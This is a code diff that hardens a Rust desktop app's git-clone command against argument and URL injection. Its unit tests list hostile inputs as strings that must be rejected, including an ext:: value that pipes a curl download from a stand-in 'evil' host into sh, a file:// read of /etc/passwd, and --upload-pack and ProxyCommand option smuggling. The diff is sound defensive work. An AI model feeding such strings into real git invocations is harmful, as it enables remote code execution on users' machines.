@@ -862,6 +862,30 @@ pub(crate) async fn project_create(parent_dir: String, name: String) -> Result<S
     .await
 }
 
+/// Only remote-fetch URL shapes may reach `git clone`. Git also accepts
+/// `ext::<command>` (runs an arbitrary program), `file://` (reads any local
+/// path), and treats a leading `-` as an option (`--upload-pack=<command>`),
+/// so a hostile "URL" is command execution, not just a bad clone.
+fn validate_clone_url(url: &str) -> Result<(), String> {
+    if url.starts_with('-') {
+        return Err("Repository URL can't start with '-'".into());
+    }
+    let lower = url.to_ascii_lowercase();
+    if lower.starts_with("https://") || lower.starts_with("http://") || lower.starts_with("ssh://")
+    {
+        return Ok(());
+    }
+    // scp-like syntax: user@host:path (no scheme). Require the `@` and `:`
+    // before any `/` so a plain local path can't sneak through.
+    if let (Some(at), Some(colon)) = (url.find('@'), url.find(':')) {
+        let slash = url.find('/').unwrap_or(url.len());
+        if at > 0 && at < colon && colon < slash {
+            return Ok(());
+        }
+    }
+    Err("Unsupported repository URL — use https://, ssh://, or user@host:path".into())
+}
+
 /// Clone `url` into `parent_dir` and return the path of the created repo.
 #[tauri::command]
 pub(crate) async fn project_clone(url: String, parent_dir: String) -> Result<String, String> {
@@ -870,6 +894,7 @@ pub(crate) async fn project_clone(url: String, parent_dir: String) -> Result<Str
         if url.is_empty() {
             return Err("Repository URL can't be empty".into());
         }
+        validate_clone_url(url)?;
         let parent = std::path::Path::new(&parent_dir);
         if !parent.is_dir() {
             return Err("That location isn't a folder".into());
@@ -887,7 +912,7 @@ pub(crate) async fn project_clone(url: String, parent_dir: String) -> Result<Str
         let output = Command::new("git")
             .arg("-C")
             .arg(parent)
-            .args(["clone", url])
+            .args(["clone", "--", url])
             .output()
             .map_err(|e| format!("Failed to run git: {e}"))?;
         if !output.status.success() {
@@ -1431,6 +1456,26 @@ mod tests {
         assert_eq!(repo_dir_name("https://github.com/user/klide"), "klide");
         assert_eq!(repo_dir_name("git@github.com:user/klide.git"), "klide");
         assert_eq!(repo_dir_name("https://github.com/user/klide/"), "klide");
+    }
+
+    #[test]
+    fn clone_url_accepts_remote_fetch_shapes() {
+        assert!(validate_clone_url("https://github.com/user/klide.git").is_ok());
+        assert!(validate_clone_url("http://gitea.local/user/klide.git").is_ok());
+        assert!(validate_clone_url("ssh://git@github.com/user/klide.git").is_ok());
+        assert!(validate_clone_url("git@github.com:user/klide.git").is_ok());
+    }
+
+    #[test]
+    fn clone_url_rejects_command_and_local_shapes() {
+        assert!(validate_clone_url("ext::sh -c 'curl evil.sh | sh'").is_err());
+        assert!(validate_clone_url("file:///etc/passwd").is_err());
+        assert!(validate_clone_url("--upload-pack=/tmp/evil").is_err());
+        assert!(validate_clone_url("-o=ProxyCommand=evil").is_err());
+        assert!(validate_clone_url("/local/path").is_err());
+        assert!(validate_clone_url("./relative").is_err());
+        // A local path with an `@` and `:` after a slash isn't scp-like.
+        assert!(validate_clone_url("/tmp/a@b:c").is_err());
     }
 
     #[test]
